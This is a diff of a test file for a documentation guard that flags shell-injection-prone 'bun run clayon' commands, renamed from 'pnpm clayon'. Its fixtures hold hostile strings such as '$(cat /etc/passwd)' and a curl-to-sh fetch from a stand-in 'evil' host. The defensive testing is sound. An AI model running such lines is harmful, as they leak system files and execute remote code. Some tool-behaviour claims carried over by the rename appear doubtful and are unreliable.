@@ -7,7 +7,7 @@ import { describe, expect, it } from "vitest";
 import { generateReadme } from "../services/company-export-readme.js";
 
 // The Clayon CLI is unsafe when an operator or an agent runs it through
-// `pnpm clayon <sub> <arg>` with a content-bearing argument. `pnpm` treats
+// `bun run clayon <sub> <arg>` with a content-bearing argument. `bun run` treats
 // `clayon` as a `package.json` script. It appends the argument to a
 // double-quoted `/bin/sh` command string, so the shell reads the argument first
 // and runs command substitution (a backtick pair or `$( )`) and variable
@@ -15,18 +15,18 @@ import { generateReadme } from "../services/company-export-readme.js";
 // binary directly. It passes the argument as an inert argv value and does not
 // run a shell over the value. `npx clayon` is the safe form.
 //
-// `pnpm exec clayon` is not a safe substitute. The root workspace does not
-// depend on the `clayon` package, so `pnpm` never links its binary into
+// `bun x clayon` is not a safe substitute. The root workspace does not
+// depend on the `clayon` package, so `bun` never links its binary into
 // `node_modules/.bin`. The command fails with `Command "clayon" not found`,
 // even after a build. The guard bans it from the guidance surfaces.
 //
-// This guard is fail-closed against an exact allowlist. A `pnpm clayon`
+// This guard is fail-closed against an exact allowlist. A `bun run clayon`
 // line is allowed only when its full command string matches an exact entry in
-// `PNPM_ALLOWLIST`. Each allowlist entry is a fully literal local lifecycle or
+// `BUN_ALLOWLIST`. Each allowlist entry is a fully literal local lifecycle or
 // setup command. A fully literal command carries no substitutable value: no
 // placeholder, no example value the reader replaces, no interpolation, no path,
 // no ref, no id, and no name. It holds the subcommand and, at most, flags that
-// take no value. Every other `pnpm clayon` line is an offender and must use
+// take no value. Every other `bun run clayon` line is an offender and must use
 // `npx clayon` (or the direct-exec form for local source).
 
 const here = path.dirname(fileURLToPath(import.meta.url));
@@ -38,7 +38,7 @@ function read(relPath: string): string {
 
 // Return the `### Offline and air-gapped use` subsection of `doc/CLI.md`. The
 // subsection runs from its own heading to the next Markdown heading. The scan
-// reads only this text, so a `pnpm` mention in another section does not affect
+// reads only this text, so a `bun` mention in another section does not affect
 // the offline-guidance assertions.
 function extractOfflineSubsection(cli: string): string {
   const marker = "### Offline and air-gapped use";
@@ -51,71 +51,71 @@ function extractOfflineSubsection(cli: string): string {
 
 // ── The exact allowlist ───────────────────────────────────────────────────
 //
-// Each entry is a fully literal command string. A `pnpm clayon` line is
+// Each entry is a fully literal command string. A `bun run clayon` line is
 // allowed only when its extracted command string equals one of these entries.
 // Add a new entry only for a command that carries no substitutable value.
 
-const PNPM_ALLOWLIST = new Set<string>([
-  "pnpm clayon --help",
-  "pnpm clayon run",
-  "pnpm clayon onboard",
-  "pnpm clayon onboard --yes",
-  "pnpm clayon onboard --run",
-  "pnpm clayon onboard --yes --run",
-  "pnpm clayon doctor",
-  "pnpm clayon doctor --repair",
-  "pnpm clayon auth bootstrap-ceo",
-  "pnpm clayon connect",
-  "pnpm clayon migrate",
-  "pnpm clayon db:backup",
-  "pnpm clayon configure --section server",
-  "pnpm clayon configure --section secrets",
-  "pnpm clayon configure --section storage",
-  "pnpm clayon configure --section database",
-  "pnpm clayon env",
-  "pnpm clayon env-lab up",
-  "pnpm clayon env-lab doctor",
-  "pnpm clayon env-lab status --json",
-  "pnpm clayon env-lab down",
-  "pnpm clayon context show",
-  "pnpm clayon context list",
-  "pnpm clayon issue list",
-  "pnpm clayon dashboard get",
-  "pnpm clayon plugin list",
-  "pnpm clayon feedback report",
-  "pnpm clayon feedback report --payloads",
-  "pnpm clayon feedback export",
-  "pnpm clayon instance settings:experimental",
-  "pnpm clayon worktree ensure-seeded",
-  "pnpm clayon worktree repair",
-  "pnpm clayon worktree env",
-  "pnpm clayon worktree env --json",
+const BUN_ALLOWLIST = new Set<string>([
+  "bun run clayon --help",
+  "bun run clayon run",
+  "bun run clayon onboard",
+  "bun run clayon onboard --yes",
+  "bun run clayon onboard --run",
+  "bun run clayon onboard --yes --run",
+  "bun run clayon doctor",
+  "bun run clayon doctor --repair",
+  "bun run clayon auth bootstrap-ceo",
+  "bun run clayon connect",
+  "bun run clayon migrate",
+  "bun run clayon db:backup",
+  "bun run clayon configure --section server",
+  "bun run clayon configure --section secrets",
+  "bun run clayon configure --section storage",
+  "bun run clayon configure --section database",
+  "bun run clayon env",
+  "bun run clayon env-lab up",
+  "bun run clayon env-lab doctor",
+  "bun run clayon env-lab status --json",
+  "bun run clayon env-lab down",
+  "bun run clayon context show",
+  "bun run clayon context list",
+  "bun run clayon issue list",
+  "bun run clayon dashboard get",
+  "bun run clayon plugin list",
+  "bun run clayon feedback report",
+  "bun run clayon feedback report --payloads",
+  "bun run clayon feedback export",
+  "bun run clayon instance settings:experimental",
+  "bun run clayon worktree ensure-seeded",
+  "bun run clayon worktree repair",
+  "bun run clayon worktree env",
+  "bun run clayon worktree env --json",
 ]);
 
 // ── Documentation phrases ─────────────────────────────────────────────────
 //
-// A policy or warning sentence names `pnpm clayon` on purpose to tell the
+// A policy or warning sentence names `bun run clayon` on purpose to tell the
 // reader not to use it, or to describe the abstract command form. These phrases
 // are not runnable commands, so they are exempt. The set is narrow and exact: a
 // mixed safe/unsafe example does not match, because its command string carries a
 // real subcommand and arguments.
 
 const DOC_PHRASES = new Set<string>([
-  // A bare mention such as `` `pnpm clayon` `` inside prose.
-  "pnpm clayon",
+  // A bare mention such as `` `bun run clayon` `` inside prose.
+  "bun run clayon",
   // The abstract command form the policy section discusses.
-  "pnpm clayon <command> <args>",
+  "bun run clayon <command> <args>",
 ]);
 
 // ── Command extraction ────────────────────────────────────────────────────
 //
-// Extract the full logical command that a reader runs from a `pnpm clayon`
+// Extract the full logical command that a reader runs from a `bun run clayon`
 // occurrence. The guard compares the whole runnable command against the
 // allowlist, never a prefix. A quote, a backtick, or a parenthesis is a shell
 // metacharacter, not a safe extraction boundary. The guard must not truncate
 // the command at one of them and then match the shorter prefix. If it did, a
-// line such as `pnpm clayon run "$(cat secret)"` would truncate to the
-// allowlisted `pnpm clayon run` and pass, while the copied command still
+// line such as `bun run clayon run "$(cat secret)"` would truncate to the
+// allowlisted `bun run clayon run` and pass, while the copied command still
 // runs the shell substitution.
 //
 // The guard trusts a string span only inside a proven literal context. The
@@ -136,13 +136,13 @@ const DOC_PHRASES = new Set<string>([
 //    after optional whitespace) follows the close delimiter. A bare comma is not
 //    enough. An array element or a call argument also ends at a comma, and a
 //    later `join` or a call concatenates it with an untrusted tail. The shape
-//    `["pnpm clayon run", tail].join("")` extracts the allowlisted prefix
+//    `["bun run clayon run", tail].join("")` extracts the allowlisted prefix
 //    but the runtime value carries the tail. The guard trusts only the direct
 //    `command:` property, so it fails closed on every other comma-terminated span.
 //  - Any other file type: never trust a span, and fail closed.
 //
 // The guard trusts a span only when its opener is adjacent to the marker: the
-// delimiter, then optional whitespace or a `$ ` shell prompt, then `pnpm`. When
+// delimiter, then optional whitespace or a `$ ` shell prompt, then `bun`. When
 // the guard trusts the span, the next matching delimiter closes it, and the
 // command is the text from the marker to that close.
 //
@@ -151,7 +151,7 @@ const DOC_PHRASES = new Set<string>([
 // a parenthesis here is a shell metacharacter, so it stays in the extracted
 // command. The command then fails the allowlist match and the guard reports it.
 // This is the key rule: a quote or a backtick that follows the command is never
-// a truncation boundary, so a line such as `pnpm clayon run "$(cat secret)"`
+// a truncation boundary, so a line such as `bun run clayon run "$(cat secret)"`
 // keeps its dangerous suffix and the guard rejects it.
 //
 // The guard never infers a safe enclosing span from an arbitrary unmatched
@@ -288,16 +288,16 @@ function extractCommand(relPath: string, text: string, at: number): string {
   return normalizeCommand(raw);
 }
 
-// A `pnpm clayon` occurrence is an offender when it is wrapped in a
+// A `bun run clayon` occurrence is an offender when it is wrapped in a
 // command-substitution span, or when its full command string is neither an
 // allowlist entry nor a documentation phrase. The command-substitution check
-// catches `$(pnpm clayon ...)`, which normalizes the dangerous habit of
+// catches `$(bun run clayon ...)`, which normalizes the dangerous habit of
 // running the CLI inside a shell substitution even when the inner command is
 // literal.
 
 function findOffenders(relPath: string, text: string): string[] {
   const offenders: string[] = [];
-  const marker = "pnpm clayon";
+  const marker = "bun run clayon";
   let from = 0;
   for (;;) {
     const at = text.indexOf(marker, from);
@@ -310,7 +310,7 @@ function findOffenders(relPath: string, text: string): string[] {
       offenders.push(command);
       continue;
     }
-    if (PNPM_ALLOWLIST.has(command)) continue;
+    if (BUN_ALLOWLIST.has(command)) continue;
     if (DOC_PHRASES.has(command)) continue;
     offenders.push(command);
   }
@@ -383,7 +383,7 @@ function listGuidanceFiles(rootDir = repoRoot): string[] {
       if (entry.isDirectory()) {
         if (SKIP_DIRS.has(entry.name)) continue;
         if (SKIP_PATH_PREFIXES.some((prefix) => `${relPath}/`.startsWith(prefix))) continue;
-        if (SKIP_DIRS.has(entry.name) || relPath === ".clayon-runtime") continue;
+        if (relPath === ".clayon-runtime") continue;
         walk(path.join(absDir, entry.name), relPath);
         continue;
       }
@@ -403,7 +403,7 @@ function listGuidanceFiles(rootDir = repoRoot): string[] {
 // A shell reads a backslash at the end of a line as a line join. So one
 // command can spread its content-bearing arguments across many physical
 // lines. The scan must see the whole command, not one physical line. If it
-// checks each physical line alone, a `pnpm clayon` command whose unsafe
+// checks each physical line alone, a `bun run clayon` command whose unsafe
 // argument sits on a later line passes undetected.
 //
 // `toLogicalLines` joins each backslash-continued physical line to the next
@@ -458,11 +458,11 @@ function scanForOffenders(): string[] {
   return offenders;
 }
 
-// A line that recommends the broken `pnpm exec clayon` form. A warning line
+// A line that recommends the broken `bun x clayon` form. A warning line
 // names the broken form on purpose to tell the reader not to use it. Skip such a
 // line, so the note itself does not trip the ban.
 function recommendsBrokenExecForm(line: string): boolean {
-  if (!line.includes("pnpm exec clayon")) return false;
+  if (!line.includes("bun x clayon")) return false;
   const lower = line.toLowerCase();
   const warns =
     lower.includes("broken") ||
@@ -522,7 +522,7 @@ describe("clayon CLI invocation safety", () => {
       for (const relPath of fixtures) {
         const file = path.join(fixtureRoot, relPath);
         mkdirSync(path.dirname(file), { recursive: true });
-        writeFileSync(file, "pnpm clayon issue get issue-1\n");
+        writeFileSync(file, "bun run clayon issue get issue-1\n");
       }
       const files = listGuidanceFiles(fixtureRoot).sort();
       expect(files).toEqual([
@@ -544,7 +544,7 @@ describe("clayon CLI invocation safety", () => {
       execFileSync("git", ["init", "--quiet"], { cwd: root });
       writeFileSync(path.join(root, ".gitignore"), "ignored.md\ntracked.md\n");
       for (const name of ["ignored.md", "untracked.md", "tracked.md"]) {
-        writeFileSync(path.join(root, name), "pnpm clayon issue get issue-1\n");
+        writeFileSync(path.join(root, name), "bun run clayon issue get issue-1\n");
       }
       execFileSync("git", ["add", "--force", "tracked.md"], { cwd: root });
 
@@ -558,20 +558,20 @@ describe("clayon CLI invocation safety", () => {
     }
   });
 
-  it("allows only exact-allowlist pnpm clayon commands on every guidance surface", () => {
+  it("allows only exact-allowlist bun run clayon commands on every guidance surface", () => {
     const offenders = scanForOffenders();
     expect(
       offenders,
-      `Each pnpm clayon line must match an exact allowlist entry, else use ` +
+      `Each bun run clayon line must match an exact allowlist entry, else use ` +
         `npx clayon (or the direct-exec form for local source):\n${offenders.join("\n")}`,
     ).toEqual([]);
   });
 
-  it("never recommends the broken pnpm exec clayon form", () => {
+  it("never recommends the broken bun x clayon form", () => {
     const offenders = scanForBrokenExecForm();
     expect(
       offenders,
-      `\`pnpm exec clayon\` does not resolve the CLI binary; use \`npx clayon\`:\n${offenders.join("\n")}`,
+      `\`bun x clayon\` does not resolve the CLI binary; use \`npx clayon\`:\n${offenders.join("\n")}`,
     ).toEqual([]);
   });
 
@@ -585,36 +585,36 @@ describe("clayon CLI invocation safety", () => {
 
   it("flags a value-bearing option that the old flag list omitted", () => {
     // --config, --data-dir, --instance, and --bind each carry a value.
-    expect(scanText("doc/E.md", "pnpm clayon doctor --config ./scratch.json")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon run --data-dir ./tmp/dev")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon run --instance dev")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon run --bind tailnet")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon onboard --yes --bind lan")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon doctor --config ./scratch.json")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon run --data-dir ./tmp/dev")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon run --instance dev")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon run --bind tailnet")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon onboard --yes --bind lan")).toHaveLength(1);
   });
 
   it("flags a context-profile value and every worktree path/ref/id/name option", () => {
-    expect(scanText("doc/E.md", "pnpm clayon context use default")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon context use default")).toHaveLength(1);
     // Path, ref, id, and name options on worktree commands.
-    expect(scanText("doc/E.md", "pnpm clayon worktree repair --branch PAP-1-x")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon worktree:make my-feature --start-point origin/main")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon worktree init --from-config ~/.clayon/config.json")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon worktree reseed --to PAP-1-x")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon worktree repair --branch PAP-1-x")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon worktree:make my-feature --start-point origin/main")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon worktree init --from-config ~/.clayon/config.json")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon worktree reseed --to PAP-1-x")).toHaveLength(1);
   });
 
   it("does not let an npx mention on the same line suppress detection", () => {
     // A mixed line names the safe form but still shows the unsafe command.
-    const mixed = "Prefer npx clayon, but pnpm clayon issue create --title x also works.";
+    const mixed = "Prefer npx clayon, but bun run clayon issue create --title x also works.";
     expect(scanText("doc/E.md", mixed)).toHaveLength(1);
   });
 
   it("rejects a command-substitution or variable span in a recommended command", () => {
     // Backtick command substitution, $( ) command substitution, and $NAME
     // variable expansion each reach a shell before the CLI starts.
-    expect(scanText("doc/E.md", "pnpm clayon allowed-hostname `hostname`")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon issue create --title $(cat /etc/passwd)")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm clayon run --instance $INSTANCE")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon allowed-hostname `hostname`")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon issue create --title $(cat /etc/passwd)")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon run --instance $INSTANCE")).toHaveLength(1);
     // A literal command wrapped in $( ) is still an offender.
-    expect(scanText("doc/E.md", 'eval "$(pnpm clayon worktree env)"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'eval "$(bun run clayon worktree env)"')).toHaveLength(1);
   });
 
   it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
@@ -622,12 +622,12 @@ describe("clayon CLI invocation safety", () => {
     // match the whole command, not the prefix truncated at the quote or the
     // backtick. A reader who copies the line runs the shell-expanded suffix.
     // (a) A double-quoted value that carries shell-expanded content.
-    expect(scanText("doc/E.md", 'pnpm clayon run "$(cat /etc/passwd)"')).toHaveLength(1);
-    expect(scanText("doc/E.md", 'pnpm clayon doctor "$HOME/scratch.json"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'bun run clayon run "$(cat /etc/passwd)"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'bun run clayon doctor "$HOME/scratch.json"')).toHaveLength(1);
     // (b) A backtick-delimited suffix after the allowlisted command.
-    expect(scanText("doc/E.md", "pnpm clayon run `hostname`")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon run `hostname`")).toHaveLength(1);
     // A single-quoted suffix is also part of the full command.
-    expect(scanText("doc/E.md", "pnpm clayon onboard 'extra value'")).toHaveLength(1);
+    expect(scanText("doc/E.md", "bun run clayon onboard 'extra value'")).toHaveLength(1);
   });
 
   // ── Fail closed on an ambiguous quote context before the marker ──────────
@@ -642,29 +642,29 @@ describe("clayon CLI invocation safety", () => {
   //
   // Each case below extracts the full command that includes the suffix, so each
   // reports exactly one offender. On the round-4 code each accepted case
-  // extracted only `pnpm clayon run` (or `... doctor`) and reported zero
+  // extracted only `bun run clayon run` (or `... doctor`) and reported zero
   // offenders. The comment on each case marks that fail-open delta.
 
   it("fails closed on a leading unmatched double quote before the marker", () => {
     // Round-4: the leading `"` opened a span; the tail `"` closed it; the guard
-    // extracted `pnpm clayon run` and reported zero offenders (fail open).
-    const line = 'some prose with one " quote then pnpm clayon run "$(dangerous)"';
+    // extracted `bun run clayon run` and reported zero offenders (fail open).
+    const line = 'some prose with one " quote then bun run clayon run "$(dangerous)"';
     expect(scanText("doc/E.md", line)).toHaveLength(1);
     // The same shape with a doctor prefix and a `$VAR` suffix.
-    const varLine = 'a stray " quote and pnpm clayon doctor "$HOME/x"';
+    const varLine = 'a stray " quote and bun run clayon doctor "$HOME/x"';
     expect(scanText("doc/E.md", varLine)).toHaveLength(1);
   });
 
   it("fails closed on a leading unmatched backtick and on mixed delimiters", () => {
     // Round-4: the leading backtick opened a span; the tail backtick closed it;
-    // the guard extracted `pnpm clayon run` and reported zero offenders.
-    const backtick = "a stray ` tick then pnpm clayon run `hostname`";
+    // the guard extracted `bun run clayon run` and reported zero offenders.
+    const backtick = "a stray ` tick then bun run clayon run `hostname`";
     expect(scanText("doc/E.md", backtick)).toHaveLength(1);
     // Mixed: a leading unmatched backtick, then a double-quoted `$( )` suffix.
-    const mixedA = 'a stray ` tick then pnpm clayon run "$(cat secret)"';
+    const mixedA = 'a stray ` tick then bun run clayon run "$(cat secret)"';
     expect(scanText("doc/E.md", mixedA)).toHaveLength(1);
     // Mixed: a leading unmatched double quote, then a backtick suffix.
-    const mixedB = 'a stray " quote then pnpm clayon run `hostname`';
+    const mixedB = 'a stray " quote then bun run clayon run `hostname`';
     expect(scanText("doc/E.md", mixedB)).toHaveLength(1);
   });
 
@@ -672,13 +672,13 @@ describe("clayon CLI invocation safety", () => {
     // An escaped quote is literal text, not a span opener. Round-4 counted the
     // `"` in `\"` as a real delimiter, opened a span, and could fail open. The
     // guard ignores an escaped delimiter, so it extracts the full command.
-    const escapedQuote = 'a label \\" then pnpm clayon run "$(dangerous)"';
+    const escapedQuote = 'a label \\" then bun run clayon run "$(dangerous)"';
     expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
-    const escapedTick = "a label \\` then pnpm clayon run `hostname`";
+    const escapedTick = "a label \\` then bun run clayon run `hostname`";
     expect(scanText("doc/E.md", escapedTick)).toHaveLength(1);
     // An escaped delimiter directly before the marker is not an adjacent opener,
     // so the guard fails closed and keeps the dangerous suffix.
-    const adjacentEscaped = '\\"pnpm clayon run "$(dangerous)"';
+    const adjacentEscaped = '\\"bun run clayon run "$(dangerous)"';
     expect(scanText("doc/E.md", adjacentEscaped)).toHaveLength(1);
   });
 
@@ -688,9 +688,9 @@ describe("clayon CLI invocation safety", () => {
     // guard reads the full command inside the span and matches the allowlist. An
     // optional `$ ` prompt inside the span still counts as adjacent. The source
     // double-quote span is proven only by the terminator that follows its close.
-    expect(scanText("doc/E.md", "Run `pnpm clayon run` to start.")).toEqual([]);
-    expect(scanText("config/example.ts", '  command: "pnpm clayon onboard --yes --run",')).toEqual([]);
-    expect(scanText("doc/E.md", "Run `$ pnpm clayon doctor` to check.")).toEqual([]);
+    expect(scanText("doc/E.md", "Run `bun run clayon run` to start.")).toEqual([]);
+    expect(scanText("config/example.ts", '  command: "bun run clayon onboard --yes --run",')).toEqual([]);
+    expect(scanText("doc/E.md", "Run `$ bun run clayon doctor` to check.")).toEqual([]);
   });
 
   // ── Fail closed outside a proven literal context (context-aware spans) ────
@@ -707,7 +707,7 @@ describe("clayon CLI invocation safety", () => {
     // A shell concatenates the quoted string with the `$( )` result, so the close
     // quote is not a safe boundary. The `.sh` rule never trusts a quote span, so
     // the guard keeps the dangerous suffix and reports the whole command.
-    const shell = 'eval "pnpm clayon run"$(curl http://evil/x | sh)';
+    const shell = 'eval "bun run clayon run"$(curl http://evil/x | sh)';
     expect(scanText("deploy/run.sh", shell)).toHaveLength(1);
   });
 
@@ -715,7 +715,7 @@ describe("clayon CLI invocation safety", () => {
     // A Markdown double quote is prose, not a literal delimiter. The guard does
     // not trust the span, so the dangerous suffix outside the quote stays in the
     // command and the guard reports it.
-    const md = 'Run "pnpm clayon run"$(cat /etc/passwd) to start.';
+    const md = 'Run "bun run clayon run"$(cat /etc/passwd) to start.';
     expect(scanText("doc/E.md", md)).toHaveLength(1);
   });
 
@@ -723,9 +723,9 @@ describe("clayon CLI invocation safety", () => {
     // A source double quote is a literal only when a source terminator follows
     // its close. A close quote that a `+` concatenation or a `$(` expansion
     // follows is not a proven literal end, so the guard reports the command.
-    const concat = 'const cmd = "pnpm clayon run" + userInput;';
+    const concat = 'const cmd = "bun run clayon run" + userInput;';
     expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
-    const substitution = 'const cmd = "pnpm clayon run"$(inject);';
+    const substitution = 'const cmd = "bun run clayon run"$(inject);';
     expect(scanText("src/build-cmd.ts", substitution)).toHaveLength(1);
   });
 
@@ -757,7 +757,7 @@ describe("clayon CLI invocation safety", () => {
     // tail. The comma after the element is a source terminator, but it does not
     // prove a complete command, so the guard reports the whole expression.
     const source =
-      'const command = ["pnpm clayon run", userControlledTail].join("");';
+      'const command = ["bun run clayon run", userControlledTail].join("");';
     const offenders = scanText("src/build-command.ts", source);
     expect(offenders).toHaveLength(1);
   });
@@ -766,7 +766,7 @@ describe("clayon CLI invocation safety", () => {
     // A function-call argument list joins an allowlisted prefix literal with a
     // tail. The comma after the prefix is a call-argument separator, not a proof
     // of a complete command, so the guard reports the composition.
-    const source = 'const command = buildCommand("pnpm clayon run", tail);';
+    const source = 'const command = buildCommand("bun run clayon run", tail);';
     const offenders = scanText("src/build-command.ts", source);
     expect(offenders).toHaveLength(1);
   });
@@ -775,21 +775,21 @@ describe("clayon CLI invocation safety", () => {
     // The parser joins backslash-continued lines into one logical command. An
     // allowlisted first line does not make the whole command safe. The suffix on
     // the continued line still reaches a shell.
-    const quoted = ["pnpm clayon doctor \\", '  --config "$(cat secret)"'].join("\n");
+    const quoted = ["bun run clayon doctor \\", '  --config "$(cat secret)"'].join("\n");
     expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
-    const backtick = ["pnpm clayon run \\", "  `hostname`"].join("\n");
+    const backtick = ["bun run clayon run \\", "  `hostname`"].join("\n");
     const offenders = scanText("doc/EXAMPLE.md", backtick);
     expect(offenders).toHaveLength(1);
     expect(offenders[0]).toContain("doc/EXAMPLE.md:1:");
   });
 
   it("allows an exact allowlist entry and a bare documentation mention", () => {
-    expect(scanText("doc/E.md", "pnpm clayon run")).toEqual([]);
-    expect(scanText("doc/E.md", "pnpm clayon worktree env --json")).toEqual([]);
-    expect(scanText("doc/E.md", "pnpm clayon configure --section server")).toEqual([]);
+    expect(scanText("doc/E.md", "bun run clayon run")).toEqual([]);
+    expect(scanText("doc/E.md", "bun run clayon worktree env --json")).toEqual([]);
+    expect(scanText("doc/E.md", "bun run clayon configure --section server")).toEqual([]);
     // A prose mention inside backticks is not a runnable command.
-    expect(scanText("doc/E.md", "Do not use `pnpm clayon` for a content-bearing argument.")).toEqual([]);
-    expect(scanText("doc/E.md", "The `pnpm clayon <command> <args>` form is unsafe.")).toEqual([]);
+    expect(scanText("doc/E.md", "Do not use `bun run clayon` for a content-bearing argument.")).toEqual([]);
+    expect(scanText("doc/E.md", "The `bun run clayon <command> <args>` form is unsafe.")).toEqual([]);
   });
 
   // ── Direct assertions on the runtime-generated instruction surfaces ──────
@@ -803,14 +803,14 @@ describe("clayon CLI invocation safety", () => {
     // form does not stop the outer shell. Emit a static `<host>` placeholder only.
     expect(source).toContain("run npx clayon allowed-hostname <host>");
     expect(source).not.toContain("allowed-hostname ${hostname}");
-    expect(source).not.toContain("pnpm clayon allowed-hostname");
-    expect(source).not.toContain("pnpm exec clayon allowed-hostname");
+    expect(source).not.toContain("bun run clayon allowed-hostname");
+    expect(source).not.toContain("bun x clayon allowed-hostname");
   });
 
   it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
     const source = read("server/src/routes/access.ts");
-    expect(source).not.toMatch(/pnpm clayon allowed-hostname/);
-    expect(source).not.toContain("pnpm exec clayon allowed-hostname");
+    expect(source).not.toMatch(/bun run clayon allowed-hostname/);
+    expect(source).not.toContain("bun x clayon allowed-hostname");
     expect(source).toContain("npx clayon allowed-hostname <host>");
     // The onboarding host comes from the request base URL, so a requester
     // controls it. The emitted command must carry a static `<host>` placeholder
@@ -820,8 +820,8 @@ describe("clayon CLI invocation safety", () => {
 
   it("emits the safe form from the agent onboarding prompt", () => {
     const source = read("ui/src/lib/agent-onboarding-prompt.ts");
-    expect(source).not.toContain("pnpm clayon allowed-hostname");
-    expect(source).not.toContain("pnpm exec clayon allowed-hostname");
+    expect(source).not.toContain("bun run clayon allowed-hostname");
+    expect(source).not.toContain("bun x clayon allowed-hostname");
     expect(source).toContain("npx clayon allowed-hostname <host>");
   });
 
@@ -831,14 +831,14 @@ describe("clayon CLI invocation safety", () => {
       { companyName: "Acme", companyDescription: null },
     );
     expect(readme).toContain("npx clayon company import this-github-url-or-folder");
-    expect(readme).not.toContain("pnpm clayon company import");
-    expect(readme).not.toContain("pnpm exec clayon company import");
+    expect(readme).not.toContain("bun run clayon company import");
+    expect(readme).not.toContain("bun x clayon company import");
   });
 
   it("emits the safe form in the company-export preview builder", () => {
     const source = read("ui/src/pages/CompanyExport.tsx");
-    expect(source).not.toContain("pnpm clayon company import");
-    expect(source).not.toContain("pnpm exec clayon company import");
+    expect(source).not.toContain("bun run clayon company import");
+    expect(source).not.toContain("bun x clayon company import");
     expect(source).toContain("npx clayon company import");
   });
 
@@ -847,7 +847,7 @@ describe("clayon CLI invocation safety", () => {
   // The server startup banner, the UI bootstrap fallback, and the board skill
   // emit the onboard, bootstrap, and board-setup hints. These three surfaces
   // reach readers on the published install, who have no monorepo checkout. The
-  // `pnpm clayon` script resolves only inside a checkout, so each surface
+  // `bun run clayon` script resolves only inside a checkout, so each surface
   // must pin the `npx clayon` form. The client connection-error hint also
   // reaches a reader who may run an installed package, so it keeps `npx`. The
   // env-lab cleanup hint runs from a source checkout and must work from any
@@ -856,14 +856,14 @@ describe("clayon CLI invocation safety", () => {
   it("emits the onboard hint from the server startup banner", () => {
     const source = read("server/src/startup-banner.ts");
     expect(source).toContain("npx clayon onboard");
-    expect(source).not.toContain("pnpm clayon onboard");
-    expect(source).not.toContain("pnpm exec clayon onboard");
+    expect(source).not.toContain("bun run clayon onboard");
+    expect(source).not.toContain("bun x clayon onboard");
   });
 
   it("emits the safe run form from the client connection-error hint", () => {
     const source = read("cli/src/client/http.ts");
     expect(source).toContain("npx clayon run");
-    expect(source).not.toContain("pnpm clayon run");
+    expect(source).not.toContain("bun run clayon run");
   });
 
   it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
@@ -878,10 +878,10 @@ describe("clayon CLI invocation safety", () => {
     expect(source).toContain("fileURLToPath(import.meta.url)");
     expect(source).toContain('path.join(cliRoot, "src", "index.ts")');
     expect(source).toContain("env-lab down");
-    // The bare `pnpm clayon` script form is unsafe. Do not restore it.
-    expect(source).not.toContain("pnpm clayon env-lab");
-    // `pnpm exec clayon` does not resolve the CLI binary. Do not use it.
-    expect(source).not.toContain("pnpm exec clayon env-lab");
+    // The bare `bun run clayon` script form is unsafe. Do not restore it.
+    expect(source).not.toContain("bun run clayon env-lab");
+    // `bun x clayon` does not resolve the CLI binary. Do not use it.
+    expect(source).not.toContain("bun x clayon env-lab");
     // The CWD-relative form breaks from a checkout subdirectory. Do not restore it.
     expect(source).not.toContain(
       "node cli/node_modules/tsx/dist/cli.mjs cli/src/index.ts env-lab down",
@@ -891,15 +891,15 @@ describe("clayon CLI invocation safety", () => {
   it("emits the bootstrap fallback command from the UI", () => {
     const source = read("ui/src/bootstrapSetup.ts");
     expect(source).toContain("npx clayon auth bootstrap-ceo");
-    expect(source).not.toContain("pnpm clayon auth bootstrap-ceo");
-    expect(source).not.toContain("pnpm exec clayon auth bootstrap-ceo");
+    expect(source).not.toContain("bun run clayon auth bootstrap-ceo");
+    expect(source).not.toContain("bun x clayon auth bootstrap-ceo");
   });
 
   it("emits the setup form from the board skill", () => {
     const source = read("skills/clayon-board/SKILL.md");
     expect(source).toContain("npx clayon board setup");
-    expect(source).not.toContain("pnpm clayon board setup");
-    expect(source).not.toContain("pnpm exec clayon board setup");
+    expect(source).not.toContain("bun run clayon board setup");
+    expect(source).not.toContain("bun x clayon board setup");
   });
 
   // ── The safe-invocation note ─────────────────────────────────────────────
@@ -919,12 +919,12 @@ describe("clayon CLI invocation safety", () => {
     // The offline subsection must exist and must name the cache-only safe form.
     expect(subsection).toContain("### Offline and air-gapped use");
     expect(subsection).toContain("npx --offline clayon");
-    // The offline subsection must not present `pnpm clayon` or
-    // `pnpm exec clayon` as a safe or offline form. Only a warning line
-    // may name `pnpm clayon`, and it must tell the reader not to use it.
+    // The offline subsection must not present `bun run clayon` or
+    // `bun x clayon` as a safe or offline form. Only a warning line
+    // may name `bun run clayon`, and it must tell the reader not to use it.
     for (const line of subsection.split("\n")) {
-      expect(line).not.toContain("pnpm exec clayon");
-      if (line.includes("pnpm clayon")) {
+      expect(line).not.toContain("bun x clayon");
+      if (line.includes("bun run clayon")) {
         expect(line.toLowerCase()).toContain("do not use");
       }
     }
